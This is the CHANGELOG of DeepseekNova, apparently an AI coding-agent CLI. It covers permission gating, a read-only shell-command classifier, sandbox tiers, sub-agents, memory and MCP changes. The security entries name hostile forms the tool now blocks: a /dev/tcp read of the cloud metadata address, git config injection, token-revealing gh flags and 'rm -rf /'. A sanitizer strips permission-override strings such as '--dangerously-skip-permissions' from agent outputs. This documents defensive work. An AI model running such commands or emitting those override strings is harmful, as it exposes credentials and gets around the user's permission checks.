  `.deepseeknova/skills/fitness.json`。失败模式库：security 新增
  `failure_pattern.rs`（cluster_key 归一聚类、suggest ≤3、脱敏 + 0600、容量
  200 LRU），落盘 `.deepseeknova/security/failure-patterns.json`，runtime 每次
  会话 `suggest(3)` 注入首轮 system prompt（无模式零注入）。度量：Scorecard
  新增 protocol/composite 维（`composite_index` 加权 0.30/0.25/0.20/0.15/0.10，
  `fill_protocol` 由 metrics hook 填充；旧评分卡反序列化缺省 1.0）。全部能力
  挂 `[protocol] enabled`，默认 false 时行为与现状完全一致。

- **权限裁决契约与只读命令分类器**：`PermissionGate::check` 返回完整
  `CheckVerdict`（decision + reason + hard-deny 标志 + 规则建议），阻断文案
  透出原因与"拒绝即教育"建议；`deepseeknova-security::readonly` 四层分类
  （任意参数安全 / 零参 / 精确形式 / git·gh·docker·find·tar·openssl·xattr·
  gpg·journalctl·plutil 子命令 flag 白名单）+ 引用感知注入检测，只读命令在
  无 deny/ask 规则命中时免询问放行；普通 shell 组合（命令替换、链式、重定向）
  归 NotReadOnly 走权限审批/规则，工具级注入面（git 全局 `-c`/`--config-env`、
  格式串注入、UNC/URL/SMB 路径形态）硬拒且不可被规则覆盖；执行器形态
  （`find -exec`、`git submodule foreach` 等）由专项白名单拒进只读表；
  显式 deny/ask 规则优先于只读免询问。
- **子代理工具执行层 + 输出净化**：`SubAgentRunner` 补上工具执行段（assistant
  tool_calls → 逐条 Tool 结果，保住 replay 不变量），执行前经共享
  `PermissionGate` 检查（Deny 回填原因、Ask 视为拒绝、无 gate 时与主 agent
  权限关闭语义一致）；父级 deny 规则渲染为冻结清单注入子代理 system prompt；
  delegate / 子代理最终输出与 `remember` 写路径经 `sanitize_output` 中和
  权限修改指令形状（`permissions.allow`、`--dangerously-skip-permissions`、
  `<settings-json>` 等），防持久化注入。
- **沙箱三档模型**：`SandboxTier`（ReadOnly / WorkspaceWrite / FullAccess）
  在 seatbelt 与 bubblewrap 两侧渲染一致策略；runtime 装配 `WorkspaceWrite`
  并把工作区根并入可写绑定（`[sandbox] writable_paths` 之外工作区默认可写）。

### Changed

- 审核修复：`[memory] mid_run_*` 配置真实生效（含 `mid_run_graph_top_k` 的代码图命中）；
  记忆库主 FTS 表与 trigram 表写入事务化并在打开时对账回填；蒸馏文件关联仅统计本 run
  新增消息；`AgentRoleProviders` 标记 `#[non_exhaustive]`；`upsert_embedding` 补齐
  `created_at` 时间戳。

- 删除实验性 `deepseeknova-orch` crate（GOAP + Swarm，零业务调用）；其唯一有消费者的组件 `ProgressTracker` 已解耦收编至 `deepseeknova-core::progress`。多智能体能力改由 `deepseeknova-agent` 的 delegate/子代理路径提供。CLI dev-dependency、quickstart 示例的 GOAP 段、release 脚本与 README crate 表中的 orch 引用一并清除。
- `compaction_threshold_tokens` 留空时运行时按 `budget.max_total_tokens / 2` 推导，
  让无损的 L1 结果截断默认生效；显式配置与 `[budget] enabled=false` 时行为不变。
- 内置工具 schema 文案精简 41%（7819→4613 字符），降低每次缓存未命中的固定 token 开销。
- 权限“拒绝即教育”建议改为精确匹配规则（`Rule.exact`）：含 `*` 的命令
  （如 `rm *.tmp`）生成的建议不再被 glob 前缀解释放大成 `rm -rf /`；
  用户手写 glob 规则语义不变。
- Coordinator 步骤历史有界：最多 50 条、总 50 万字符、单条 2000 字符截断，
  超出丢最旧，避免后续 executor prompt 线性膨胀。
- TUI：`/` 斜杠命令模糊候选与参数候选、`keybindings.json` 键位定制（热重载）、
  `$EDITOR` 外部编辑（`Ctrl+X Ctrl+E`）、权限审批浮层（`y`/`Enter` 允许、
  `n`/`Esc` 拒绝）、`Esc` 生成中取消/空闲二次确认退出。

### Fixed

- 只读分类器：`date -u`/`date +%s`/`hostname -f`/`hostname -s` 此前按前缀
  匹配进"任意参数安全"表，`date -u -s ...`、`hostname -f newname` 等写形态
  被免询问放行；改为精确 argv 匹配。`gh auth status --show-token=true` /
  `-t=true` 布尔形态此前绕过 token 泄露拒绝，现按 `=value` 归一化判定。
  `journalctl --setup-keys` / `--update-catalog` 写操作补入拒绝列表。
- 路径守卫：`is_within_workspace` 对含不存在中间目录的 `..` 路径（如
  `root/missing/../../outside/file`）向上回溯时丢弃 `..` 分量，误判为工作区内
  （工具 `create_dir_all` 后真实解析到工作区外）；回溯余段现保留
  `ParentDir` 并在拼接后词法折叠。
- 权限建议：命中 deny 规则时不再附加"添加 allow 规则即可自动放行"建议
  （deny 优先于 allow，该建议无效且误导用户）。
- bubblewrap `FullAccess` 档此前只绑定 `writable_paths`，与 seatbelt 全写语义
  及 `SandboxTier` 文档不符；现绑定 `/` 读写并移除只读系统绑定。
- 子代理无 permission gate 时此前全部工具 fail-closed，与
  `permissions.enabled=false`（不经过门控）及主 agent 行为不一致；现与主路径
  对齐直接执行，需要 fail-closed 的调用方显式挂 gate。
- agent 审查测试临时 git 仓库改用 `tempfile::tempdir()`，消除并行执行纳秒
  撞名导致的 `git init` flaky。
- 只读分类器：`gh api` 带 `-f`/`-F`/`--input` 且未显式 `--method GET`/`-X GET`
  时此前默认判只读，gh 实际会自动切 POST（创建/更新资源可免询问执行）；现归
  `NotReadOnly`。`file` 移出“任意参数安全”表，`-C`/`--compile`（写
  `magic.mgc`）不再放行；裸 `printenv` 不再只读（仅显式变量名放行）。
- 常规 shell 组合（链式/重定向/命令替换/反引号）此前判 `Dangerous` 硬拒且
  allow 规则无法覆盖，现归 `NotReadOnly` 走审批/规则；`Dangerous` 仅保留
  工具级注入面（`git -c`/`--config-env`、格式串注入、UNC/URL/SMB 路径形态）。
- 删除未挂模块的调试测试文件 `tui/render/dbg_status_test.rs`。

- 依赖健康修复：OpenTelemetry 栈 0.27→0.32（telemetry 适配
  `SdkTracerProvider` / `Resource::builder`，依赖特性统一收敛为 trace-only），ratatui 0.29→0.30（lru 0.12
  unsound 与 paste unmaintained 两项豁免随之移除），crossterm 0.28→0.29，
  rand 0.8→0.9（`rng().random_range`），thiserror 1→2，criterion 0.5→0.8
  （bench 改用 `std::hint::black_box`）。`cargo deny` 重复依赖警告从 16 组
  降至 0（剩余 5 组上游传递/目标平台分叉在 `deny.toml [bans].skip` 显式登记）。
- scanner 测试临时目录改用 `tempfile::tempdir()`，消除并行测试纳秒撞名导致的
  flaky 失败。

- Graph Go 分组类型声明 `type ( A struct{}; B interface{} )` 此前只采集第一个
  type_spec（tree-sitter-go 0.25 的 type_declaration children 为 multiple），组内
  第 2+ 个类型静默丢失、引用不可解析；现遍历全部 type_spec 逐个产出实体。
- Graph Go 分组类型声明的引用边归属：修复轮此前在 type_declaration Enter 时批量
  push 全部成员，成员 1..n-1 的体内引用与自身 name 节点落入最后一个成员的 set
  （`type ( A struct{next *B; ext *C}; B struct{} )` 产生伪边 B→A、A 无出边）；
  现改为每个 type_spec 成员 Enter 时逐个建实体、成员结束时出栈，引用归属各自
  成员。同步恢复类型实体 doc（注释在 type 关键字之前，回退父节点提取）与
  signature 的 `type ` 前缀（单声明与旧行为逐字等价）。
- `go.mod` 的 `require ( // 尾注释` 形态（gofmt 不产但合法）此前整块依赖静默丢失；
  现块起始容忍尾注释。replace/exclude 段确认不进依赖（负例测试固化）。
- 评分卡 task_rate 回填：Cancelled 且零失败详情的会话此前被误标
  `first_pass=true`；现回填仅覆盖失败型会话（failures 非空），其余保持 metrics
  侧已填值。损坏 scorecard JSON 解析失败此前静默 Ok 无告警；现 warn 一次后返回
  Ok（与 NotFound 静默区分），真实 IO 错误仍 Err 传播。
- 配置分层：`[quality]` / `[protocol]` / `[delegate]`（含新增 `inputs`）此前未进入
  `Config::merge`，在用户/项目配置文件中不生效；`[attribution]` 整体赋值会被项目层
  缺省覆盖。现改为字段级非默认值合并，各段配置真正生效。
- Coordinator `parse_plan`：`depends_on` 引用的目标节点排在数组后面时，依赖边会被
  `add_edge` 的未知节点校验静默丢弃；改为先加全部节点再统一补边。
- serve 多会话此前共用固定 `session-<ts>` 标注，诊断报告互相覆盖，且评分卡文件名
  与 Paused/诊断 id 不同源；现未标注时每次 run 生成唯一 id，评分卡/诊断/Paused
  共用同一 session id。
- 共享 Agent 的 quality findings 跨 run 污染诊断报告与对抗审查触发条件；诊断与
  对抗审查现按 run 起始长度差分切片（与 MetricsGuard 的 F4 语义一致）。
- 蒸馏 skill 标题此前仅保留 ASCII，中文标题生成空 slug 导致落盘失败；现保留
  Unicode 字母数字（含 CJK），并拒绝缩成 `.`/`..` 的标点标题。
- Parallel 子节点失败时不写回共享容器，兄弟 Observe 看不到失败产出；现失败也
  写回 Error，Observe 在无 ToolResult 时可见失败输出。

---

### ⚠ Breaking（并行优化轮，2026-08-07）

- **权限门控默认开启**：`[permissions] enabled` 默认值从 `false` 改为 `true`
  （`PermissionsConfig`）。默认配置下工具调用走 allow/ask/deny 门控，写工具
  （bash/write_file 等）需审批或规则放行；依赖旧"无条件执行"的自动化需显式
  `[permissions] enabled = false`。交互 CLI 有 REPL 审批 responder 兜底（见下），
  serve/库级路径 Ask 默认拒绝。
- **Ask 无 responder 默认 fail-closed**：`PermissionsConfig.ask_without_responder`
  新配置项（默认 `"deny"`）。非交互/库级消费者（CLI 非交互、serve 直连）在无
  人工审批通道时不再自动放行，改为拒绝并记录审计事件；显式配置 `"allow"` 可
  恢复旧行为。消除与子代理侧 fail-closed 的行为不对称。

### Added（并行优化轮，2026-08-07）

- **serve 暴露面加固**：CORS 由 `allow_origin(Any)` 收窄为 **loopback-only**
  （`localhost`/`127.0.0.1`/`::1`，任意端口），恶意网页无法跨源读取
  SSE/会话/评分卡或自答 `/v1/approval`；`done` SSE 事件新增 `session_id`
  （durable run id / 会话 id 由 serve 注入），run→评分卡/诊断建立关联键。
- **默认安全姿态落地**：`--secure-defaults` 全局 flag 一键开启权限门控 + 沙箱；
  runtime 构建 agent 时任一安全层关闭即打印启动横幅
  （`⚠ security posture reduced`）；runtime 审计后端从 `TracingAuditLogger`
  切换为 **JSONL 落盘**（`.deepseeknova/security/audit.jsonl`，含
  tool_name/capability/path/allowed/reason，写盘失败仅 warn 不改变判定）；
  交互 `chat`/无子命令路径接入 `ReplApprovalResponder`（y/yes 放行、回车默认
  拒绝、Esc/Ctrl+C/EOF fail-closed）。
- **checkpoint 容量与增量持久化**：内存快照容量上限（默认 200，FIFO 淘汰最旧，
  `with_max_snapshots` 可配置）；`persist_all` 改增量追加，仅在淘汰/回滚/清空时
  全量重写，消除大目录 O(n²) I/O 与无界内存。
- **agent 热路径优化**：主循环每步会话历史全量克隆由 3–7 次降至 1~2 次——步起始
  取一次快照复用（budget 判定 / 压缩判定 / classify / provider 请求共享），压缩
  修改后重快照；`Memory` 新增零拷贝只读接口（`iter_all`/`last_message`/
  `iter_recent`/`estimate_tokens(&self)`）；`MetricsGuard.start_len` 改
  `Option<usize>`，锁忙时 emit 空 findings 不再误切片并发 run 数据。
- **MCP 协议层测试补齐**：connection/client/http_client 三个外部输入面新增 28 个
  伪造管道回放测试（请求/响应往返、半关闭、错误帧、超时、进程退出清理、HTTP
  会话头）；写通道由 unbounded 改**有界 mpsc**（慢子进程防无界内存，不丢合法
  消息）。
- **core 死模块清理**：`identity`/`prefix`/`progress`/`plugin` 四模块（约 800 行，
  workspace 零消费者经多路 grep 证实）整体删除，移除独占依赖 `serde_jcs`/
  `ryu-js`；DESIGN.md 同步标注。`deepseeknova-context` 的
  CacheAwarePromptBuilder/ContextEngine 仅产出决策意见（与 README 三层缓存承诺
  联动，归 P2-6 统一裁决），本轮未改代码。
- **serve 认证/契约文档同步**：README/README_EN 的 API key 环境变量统一为代码
  默认 `DEEPSEEK_API_KEY`（Anthropic 默认 `ANTHROPIC_API_KEY`）；GUIDE.md HTTP
  章节补齐 `/v1/sessions`、`--token`、SSE 事件清单、scorecard 示例字段修正
  （移除不存在的 `overall`）；PRODUCT.md 缺口清单更新为已实现。

### Security（并行优化轮，2026-08-07）

- **`/dev/tcp`/`/dev/udp` 伪设备拦截**：命令参数含该形态归 `Dangerous` 硬拒
  （此前 `cat /dev/tcp/169.254.169.254/80` 判只读放行，可读云元数据/本地服务）。
- **web_fetch 重定向逐跳校验**：每跳经 `validate_redirect_target`（scheme + 域名
  策略先行 + SSRF），与 web_search 对齐；DNS 重绑定接受说明保留。
- **shell 工具工作目录**：`Command` 补 `current_dir(workspace_root)`，防 `cd`
  逃逸导致后续文件操作落在工作区外。
- **move_file 双路径守卫**：`extract_path` 泛化为递归收集路径字段，
  source/destination 任一越界即硬拒。
- **记忆/待办能力门**：`remember`/`forget`/`recall`/`todo_write` 补
  `MemoryWrite`/`MemoryRead` 能力门控，与 fs/shell 一致。
- **sanitize 清单扩展**：token 补 `--yes`/`--skip_permissions`/`<setConfig>` 等
  形态；顺带修复 `--` 前缀插入到末尾无法打断 needle 的潜在死循环。
- **资源限额统一**：`read_file` 限长改读 `sec.limits.max_file_size`（缺失回落
  1MB）；`grep` 目录扫描改递归 + 字节预算/文件数预算会话级聚合，每层查
  取消/symlink 逃逸。
- **reqwest::Client 共享**：web_fetch/web_search/docs_tools 改为进程级一次构造
  共享（此前每次调用重建）。

---

### Added（并行优化第四批，2026-08-08）

- **i18n 双语框架（TUI）**：新增 `crates/deepseeknova-tui/src/i18n/`（零外部依赖）——
  `Key` 枚举 257 键 + `Lang`/`Tr`/`interpolate`，英文默认 + 中文可选（fail-safe
  缺键回退英文）。约 190 处用户可见中文文案迁入词表；`AppState.tr` 注入、
  `Command.desc` 改 `&'static Key`、命令面板按语言匹配、评分卡维名与审批风险标签
  保持数据契约（中文 JSON）不变、映射词表键做双语显示。语言选择：
  `DEEPSEEKNOVA_LANG` 环境变量 + `TuiRunner::with_lang`。**词表结构是 Tauri 壳 P2
  的共享契约**（键名/`{name}` 占位符/回退语义文档化）。
- **AGENTS.md-first onboarding**：`init` 默认生成行业标准 `AGENTS.md`（项目简介/
  常用命令/代码约定骨架，被 Claude Code/Codex/opencode/DeepseekNova 自动识别），
  已存在则跳过；`init --legacy` 回退生成私有 `DEEPSEEKNOVA.md`；结尾输出引导式
  Next steps。
- **provider 配置接线**：工具 schema 序列化结果按工具集缓存（`ToolSchemaCache`，
  注册/禁用自然失效，消除每次请求 collect+sort+序列化 4.6KB）；`[[models]]
  temperature` 经 `ModelRouter`→factory→请求体接线（OpenAI-compatible/DeepSeek/
  Anthropic/Ollama 均支持）；`kind="anthropic"` 显式配置 `reasoning_effort` 时
  应用 thinking+effort（未配置保持请求不变，避免真实 Claude 400）；删除零消费者
  `provider::telemetry`（export_telemetry 遗留桩，OTLP 导出在独立 telemetry crate）。
- **发布元数据补齐**：scanner/graph/metrics 三 crate 补 description/keywords/
  workspace 依赖版本（scanner 的 path-only 依赖改 `{ workspace = true }`，
  `cargo package` 不再报错）；README/README_EN 截图空占位改为运行说明；
  SECURITY.md 版本表更新为 latest-minor 支持策略（0.4.x Current / 0.3.x
  Backports）。
- **实证：版本须 bump 至 0.5.0**（已执行）——crates.io 的 0.4.0 已被
  2026-07-20 旧快照占用 19/22 crate，`cargo publish --dry-run` 实测 metrics 因
  代码引用当前未发布模块（`core::tool_hook`/`provider::cost`）编译失败，0.4.0
  重发当前代码不可行。已全 workspace bump 至 0.5.0（workspace.package +
  23 处内部依赖 + 20 个 crate docs URL）。

---

### Added（并行优化第五批，2026-08-08）

- **权限模式预设（P1-6）**：`[permissions] mode = "plan" | "accept_edits" |
  "auto"`——三档一键切换写工具默认裁决强度（plan=写工具全 Ask；accept_edits=
  文件编辑放行、shell 写形态仍 Ask；auto=写工具全放行）。`None`（缺省）保持旧
  行为（回退 `default_mode`），不引入静默安全回归。规则优先级不变
  （deny > ask > allow > 预设回退）。TUI `Ctrl+P` 循环切换 + 状态栏
  `perm {mode}` 段 + 审批浮层模式上下文 + `/mode` 命令（i18n 键已补）。
- **工作区信任（P1-6）**：`~/.deepseeknova/trusted.toml`（`TrustStore`，
  空存储默认 untrusted = fail-closed）。**untrusted 项目**的项目层 allow 规则
  降级为 ask（不能静默放行陌生项目的自配置规则）；`Config::load` 置位
  `project_owns_rules` 识别规则来源。TUI 首次进入带项目层规则的工作区弹信任
  确认浮层（y 信任落盘 / n 不信任）。CLI 已接线（gate 与 agent 同实例 +
  TrustController 委托 TrustStore）。
- **eval 分级升级（P1-2）**：断言扩展为 AND 语义——`must_contain`（兼容）/
  `min_score`（评分卡综合分，0..5，≤1.0 按 0..1 折算）/ `dimension_min.
  {name}`（单维，含中文别名）/ `cost_max`（跨轮累计成本）/ `rounds`（重试上限，
  任一轮全过即停）。CI 门槛：`--require-min-score <N>` / `--require-dimension
  <name>=<N>`，退出码区分条目失败(1)/CI 门槛失败(2)/两者(3)。评分卡走内存
  捕获 hook，不污染 `.deepseeknova/metrics/` 聚合。

---

### Added（并行优化第六批，2026-08-08）

- **子代理升级（P1-5）**：markdown 前端文件（`---` 头块声明 name/description/
  tools/model/gate/capabilities/max_turns + 正文为系统提示，扫描
  `.deepseeknova/agents/*.md`，与既有 TOML 预设双通道兼容）；@-mention
  （词边界感知解析，`SubAgentRunner` 无结构化行时回退 `@agent` 派发，防邮箱
  误拆）；**放开禁递归**（默认深度上限 3，`DelegationSink`/`DelegateDepth`/
  `RecursiveDelegateTool`，超深优雅降级）；**per-agent 模型/权限**
  （`ModelResolver` trait + `AgentPermission` gate/capabilities 白名单交集）。
- **会话 UX（P1-9）**：`/rename <title>` 会话命名（`titles.json` 落盘，
  title 优先显示、无 title 回退 id，TUI/REPL 双入口）；会话级 checkpoint
  `/checkpoint save|list|rollback`（`SessionCheckpointManager`，快照对话行 +
  容量 FIFO + JSONL 持久化；回退时同步重写 agent 共享 history 使模型上下文
  与显示一致；`save_with_files` API 预留文件联合快照）。16 个 i18n 新键。
- **记忆用户面（P1-11）**：`memory list`（类目/stage/tag/搜索过滤 + 分页）、
  `memory edit <id> <content>`（保留 lifecycle 元数据，启用嵌入时强制重算
  向量）、`memory delete <id>`（二次确认，`--yes` 跳过）、`memory replay
  <query>`（与 recall 同源的检索分解回放：score/bm25/cosine/lifecycle，
  只读不记召回）。core 记忆引擎新增 `MemoryScoreBreakdown`/`search_breakdown`
  /`edit`/`replay` 等最小接口（`search_hybrid` 总分管严格不变）。

---

### Added（并行优化第七批，2026-08-08）

- **用户级 hooks（P1-8）**：`[hooks]` 配置段五事件（`tool_before` /
  `tool_after` / `session_start` / `session_end` / `failure`），每条外部命令
  （command/args/timeout_secs/disabled），事件间 AND 链。JSON 协议：stdin
  传 `{event,tool,arguments,workspace,session_id}`，stdout 期望
  `{"allowed":bool,"reason"}`。**fail-closed**：`tool_before` 任一命令非 0/
  超时/崩溃或裁决拒绝 → 阻止工具执行（在内部 tool_hook 治理链之后叠加）；
  `tool_after` 失败仅 warn。`session_start/end` 于 run 边界触发、`failure`
  挂 MetricsGuard emit（Paused/异常触发，Completed/Cancelled 不触发）。
  无 hooks 配置零进程开销。config→core 类型映射由 runtime 装配层做
  （与 PermissionRule 映射同模式）。
- **exec 审计模式（P1-7）**：`deepseeknova-cli audit <cmd>` 预执行分类预览——
  输出只读放行 / Ask / 硬拒 + 命中规则 + 只读分类形态 + 建议（md/json 双
  格式，`--rules`/`--workspace` 可选）。`security::CommandAudit` 与真实
  分类器同源；`permission::PermissionGate::preview` 与真实 `check()` 共用
  `preflight+finalize` 代码路径（一致性有测试背书），**只计算不执行**（不写
  缓存/限流/审计）。
- **graph 语义检索（P2-2）**：复用 core `EmbeddingProvider` trait（记忆侧
  同款融合公式 `w*bm25 + (1-w)*cos` + fail-open 回落 FTS + 同 blob 编码）。
  写入即嵌入（节点 name/signature/doc），SCHEMA 增量加 `node_embeddings`
  表**不 bump 版本**（旧索引零破坏），按行记 model 防跨模型向量空间污染。
  `GraphIndex::open_with_embedder`/`search_hybrid[_with_weight|_breakdown]`。
  runtime 已从 memory config 接线（`try_memory_embedder`）。

---

### Added（并行优化第八批，2026-08-08，功能接线串联轮）

- **子代理递归装配（P1-5 遗留）**：`[delegate] allow_recursion = true` +
  `max_depth`（默认 3）开启 coordinator 子代理递归委派——runtime
  `build_sub_agent_runner` 装配 `RecursiveDelegateTool`（深度守门）并
  `set_delegation_sink`（`SubAgentRunner` 增 `Clone`，克隆体共享 sink 槽）；
  默认 false 完全保持既有禁递归行为。主 agent delegate 引擎路径递归深度
  传播仍待 Agent 主循环注入 `DelegateDepth`（已知后续项）。
- **graph 语义检索接线（P2-2 遗留）**：runtime 打开代码图索引时从
  `[memory] embedder = "remote"` 复用 `RemoteEmbedder` 喂给
  `GraphIndex::open_with_embedder`；缺 key/网络错 fail-open 回落纯 FTS。
- **界面语言配置（i18n CLI 接线）**：新增 `[ui] lang = "en" | "zh"`（接受
  `zh-cn`/`cn`/`中文` 别名），CLI 优先于 `DEEPSEEKNOVA_LANG` 环境变量接线到
  `TuiRunner::with_lang`；两者皆缺省为英文。

---

### Added（并行优化第九批，2026-08-08）

- **MCP streamable HTTP（P2-3）**：HTTP 传输升级——连接时自动探测 legacy SSE
  vs streamable HTTP（增量读取修正常开 SSE 流阻塞）；`Mcp-Session-Id` 完整
  生命周期（initialize 捕获 → 后续请求回发 → 服务器换 session 跟随 → 404
  过期清空）；protocolVersion 协商（支持集 2025-06-18/2025-03-26/2024-11-05，
  服务器 -32602 + supported 时降级重试，结果以服务器返回为准）；lib.rs
  "streaming" 声明改为如实（SSE 帧响应消费，不声称长连接推送）。
- **会话级花费上限（P2-4）**：`[budget] max_total_cost_usd: Option<f64>`
  （None=不限；校验拒绝负数/NaN/inf）。`CostLedger::total_usd` 查询接口 +
  `agent::budget::cost::CostBudget`（from_router 便捷构造）。主循环独立成本
  检查点：超限 → Paused（reason `budget: cost limit $X exceeded (spent $Y)`，
  保留 `budget:` 前缀对齐 CLI 退出码），token 预算路径逐字节未改。**CLI 已
  装配**（build_agent_in 返回后 from_router 注入）。跨会话累计（团队级持久化）
  留待后续。
- **缓存承诺真实化（P2-6）**：README/README_EN "三层缓存"章节撤稿改为如实
  （API 级前缀缓存真实 + 会话级命中率统计 [规划中]）；core
  `session_cache_hit_tokens` 字段 doc 标注"当前恒 0、统计 [规划中]"（serde
  契约保留，无 BREAKING）；context CacheAwarePromptBuilder/OrderedPromptBuilder
  标注"库级公开 API，默认 agent 路径未接入"。另修文档漂移：README 测试数
  1251→1571（实测属性数）、README_EN Reasoning Effort "4-level"→"3-level"
  对齐。

---

### Added（P2-5 收尾，2026-08-08）

- **RemoteEmbedder async 化（P2-5）**：`EmbeddingProvider` trait 新增
  `embed_async`（带默认实现走 `spawn_blocking` 桥接同步 `embed`，不阻塞 tokio
  worker；`Arc<Self>` + `String` 接收器 + `Send + 'static` boxed future 保持
  dyn-compatible），同步 `embed` 完全保留（全部既有实现/调用方零改动）。
  RemoteEmbedder 覆写为真实 async（直接 await reqwest），并**移除独立
  runtime 字段**（修 async 上下文 drop runtime panic 的潜在 bug；同步路径改
  进程级共享 runtime）。超时兜底不变。生产调用点迁移清单留待后续（graph/
  memory 写入与查询向量路径，涉及同步 rusqlite 函数签名）。

---

### Added（并行优化第十批，2026-08-08）

- **worktree 并行会话（P2-7）**：`deepseeknova-cli worktree new|list|switch|
  delete|clean`——主根 `.deepseeknova/worktrees/<name>` 下 `git worktree add`
  隔离副本（`.gitignore` 已覆盖，不污染主工作树）；`new` 缺省名
  `wt-<ts>-<seq>`、`--base` 指定 ref、成功打印"cd 进入启动隔离会话"指引；
  `list` 路径/分支/当前标记/`[cli]` 归属；`delete` 先查未提交变更（有则拒，
  `--force` 丢弃）；`clean` 清理全部 CLI worktree。会话隔离语义：worktree 内
  启动的会话其 graph.db/memory/审计/metrics 按 workspace_root 落盘到该
  worktree 自己的 `.deepseeknova/`，天然互不干扰。git 交互统一封装（非 git
  仓库/分支名校验/主根解析/`/var`→`/private/var` canonicalize 归一化）。
  11 个测试（含真实 git tempdir 往返）+ e2e 冒烟。
- **沙箱平台无关增强（P2-1 mac 可验证部分）**：`[sandbox] network_allow_domains`
  域名白名单配置接口 + sandbox crate 类型化 `NetworkPolicy`（默认禁网 + 空
  白名单；`requests_domain_filtering()` 供上层提示后端不支持）。warn-not-fail
  校验（空/含空白/含路径分隔符条目警告不阻断）。诚实约束：seatbelt/bwrap
  当前仅支持整网开关（SBPL 无域名原语，域名级过滤需 DNS 解析后按 IP，属
  后续）；Windows Job Object/AppContainer 后端因无法在 macOS 验证运行时
  隔离，仅落方案文档（sandbox crate doc），实现待 Windows 环境。

---

### Fixed（收尾小项，2026-08-08）

- **MCP 会话过期自动重连**：HTTP 请求遇"会话过期"信号（404 携带
  `Mcp-Session-Id` 头 / 响应空 session id）→ 自动重发 `initialize` 握手 →
  重试原请求一次（调用方无感）；重连失败/重试仍过期 → 清晰报错。每个请求
  最多重连 1 次；并发双检锁 + generation 保证多请求并发命中过期时仅一次
  重连，其余以新 session 重试（8 并发测试无 panic）。`initialize` 自身 404
  视为硬错误避免自旋。stdio 零改动。
- **embed_async 工具边界迁移**：`remember`/`recall` 工具路径的同步 HTTP
  embed（最长 30s）经 `spawn_blocking` 移出 tokio worker（线程 id 回归测试
  背书）。graph refresh 确认已在 blocking 线程池（runtime spawn_blocking）
  保留同步；graph `search_hybrid*` 证实无生产调用方（语义检索未接任何工具，
  留待产品决策）。runtime 的同步 RecallProvider/DistillHook 3 处仍待后续
  agent API 改造。
- **engine 递归深度传播**：Agent 主循环 `build_tool_context` 注入
  `DelegateDepth(1)`（根恒 1，扩展应用器之前供 with_extension 覆盖）；
  `DelegateTool` 读扩展传 `run_at_depth(depth+1)`（缺失回退 1），schema 与
  注释去掉 "no re-delegation" 改声明深度受限递归。端到端引擎递归深度链
  1→2→3 有测试（真实 Agent 循环 + DelegateEngine），超深守门以拒绝文本精确
  验证。引擎子代理自身深度注入留待 runtime 装配。

### Fixed（graph 语义检索接线，2026-08-08）

- **`search_code` 接通语义检索**（此前 P2-2 的 `search_hybrid*` 无任何工具调用，
  是死路径）：新增 `GraphIndex::search_best`——装配了嵌入后端
  （`[memory] embedder = "remote"` + API key）时走 hybrid（语义+词法融合，
  默认 `0.5*bm25 + 0.5*余弦`），否则**逐字节委托既有 `search`**（零行为变化，
  有等价性测试锁定：4 组查询 search_best == search 的名称/路径/长度一致）。
  工具侧整个 lock+检索经 `spawn_blocking` 移出 tokio worker（hybrid 路径的
  查询嵌入是 HTTP，最长 30s，与 remember/recall 工具同款模式）。语义检索只对
  显式配置嵌入的用户生效，未配置用户结果严格不变。

### Added（一键安装，2026-08-08）

- **一键安装脚本**：新增 `install.sh`（macOS/Linux）与 `install.ps1`（Windows
  PowerShell）——`curl -fsSL .../install.sh | sh` / `irm .../install.ps1 | iex`
  从 GitHub Releases 下载预编译二进制，自动检测平台（macOS Intel/ARM、Linux
  x86_64/ARM64、Windows x86_64），**SHA256 checksum 校验**（用同 Release
  `checksums.txt` 按资产名匹配，校验失败即删除并报错），默认装
  `~/.local/bin`（`INSTALL_DIR` / `-InstallDir` 可覆盖），未发布平台/无效版本
  给出清晰报错。install.sh 经 v0.4.0 真实资产端到端验证（下载/校验/安装/
  运行全通过）。
- **release.yml 平台矩阵扩充**：3 → 5 平台——新增 `macos-13`
  （`x86_64-apple-darwin`，Intel 原生 runner）与 `ubuntu-24.04-arm`
  （`aarch64-unknown-linux-gnu`，ARM 原生 runner；cli 依赖树含 tree-sitter/
  rusqlite bundled C 编译，必须原生避免交叉工具链）。
- **README 安装节**：中英同步改为"一键安装（推荐）+ cargo-binstall 备选 +
  从源码构建（备选）"，诚实注明当前 v0.4.0 资产仅 3 平台、v0.5.0 覆盖 5 平台。
- **CLI 版本号漂移修复**：`#[command(version = "0.4.0")]` 硬编码改为
  `env!("CARGO_PKG_VERSION")`——复检发现 bump 0.5.0 后 `--version` 仍显示
  0.4.0，用户装新版会误以为未更新；现与 workspace 版本自动一致。

## [0.4.0] — 2026-07-19

### 桌面前端完善

#### 设置面板 — 14 大分区
- 新增沙箱配置（白名单/黑名单路径、环境隔离、CSP）
- 新增网络配置（代理、超时、重试、SSL、网络诊断）
- 新增权限规则（12 条规则，每条独立开关）
- 新增钩子管理（事件钩子 CRUD + 变量支持）
- 新增 MCP 服务器管理（list/add/remove/toggle）
- 新增子智能体列表
- 新增诊断体检（12 项系统检查）
- 新增账单统计（Token/费用/缓存/历史）
- 新增知识库（Wiki 页 + 知识卡片）
- 新增记忆 CRUD（项目/用户/全局/会话四层）
- 新增设置持久化（save/load settings）
- 新增快捷键管理
- 新增更新检查
- 新增标签页管理（list/create/close）

#### 右侧面板 — 5 标签 + 三色进度条
- 文件标签：分修改/创建/读取三区，每区可折叠，显示 diff 行数
- 知识库标签：Wiki + 知识卡片 + 记忆三子标签
- 工具标签：MCP 工具列表 + 已加载技能
- 记忆标签：四类筛选 + 添加记忆表单
- 规则标签：8 条权限规则，每条带开关

### 后端完善

#### 47 个 Tauri 命令
- 核心命令：submit_prompt / cancel_run / new_session / respond_approval / health_check / get_config / get_capabilities
- 会话命令：list_sessions / create_session / delete_session
- 技能/Provider：list_skills / list_providers
- 工作区：get_workspace_files / get_file_diff
- 沙箱：get/set_sandbox_config
- 网络：get/set_network_config / network_diagnostics
- 权限：get_permissions / set_permission_rule
- 钩子：get_hooks / set_hook / delete_hook
- MCP：list/add/remove/toggle_mcp_server
- 子智能体：list_subagents
- 诊断：run_diagnostics
- 账单：get_billing_stats
- 知识库：get_wiki_pages / get_knowledge_cards
- 记忆：get_memories / add_memory / delete_memory
- 设置：save_settings / load_settings
- 快捷键：get_shortcuts
- 更新：check_for_updates
- 标签页：list/create/close_tab

#### bridge.ts 完整桥接
- 全部 47 个命令的 TypeScript 接口和类型定义
- EventHandlers 回调系统（text/reasoning/tool/usage/done/error）

### 依赖优化
- reqwest 从 default-tls (OpenSSL) 切换到 rustls-tls，减少系统依赖
